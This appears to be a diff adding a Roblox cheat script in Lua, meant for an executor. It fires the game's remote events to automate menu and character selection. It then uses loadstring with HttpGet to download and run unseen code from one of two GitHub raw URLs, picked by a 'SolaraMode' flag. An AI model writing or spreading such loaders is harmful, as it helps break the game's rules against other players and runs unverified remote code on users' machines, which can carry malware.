@@ -1,0 +1,62 @@
+-- Define the global variables
+getgenv().AutoMenu = true  -- Set this to false if you want to disable AutoMenu
+getgenv().SolaraMode = false -- Set this to true if you want to enable SolaraMode
+
+-- Function for AutoMenu
+if getgenv().AutoMenu then
+    local args = {
+        [1] = {
+            [1] = {
+                [1] = "\1"
+            },
+            [2] = "2"
+        }
+    }
+    
+    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))
+    wait(1.5)
+    
+    local args = {
+        [1] = {
+            [1] = "ui",
+            [2] = "LeaderboardGui"
+        }
+    }
+    
+    game:GetService("ReplicatedStorage").Utility.AssetRequester.Remote:InvokeServer(unpack(args))
+    
+    local args = {
+        [1] = "GetWeapons"
+    }
+    
+    game:GetService("ReplicatedStorage").remotes.getData:InvokeServer(unpack(args))
+    game:GetService("ReplicatedStorage").remotes.reloadInvy:InvokeServer()
+    
+    local args = {
+        [1] = "Desert Temple"
+    }
+    
+    game:GetService("ReplicatedStorage").remotes.getDungeonStats:InvokeServer(unpack(args))
+    
+    local args = {
+        [1] = {
+            [1] = {
+                [1] = "\1",
+                [2] = {
+                    ["\3"] = "select",
+                    ["characterIndex"] = 1
+                }
+            },
+            [2] = "L"
+        }
+    }
+    
+    game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))
+end
+
+-- Function for SolaraMode
+if getgenv().SolaraMode then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hen56s2/Holder/refs/heads/main/Pop"))()
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/wset3/test5/refs/heads/main/5"))()
+end
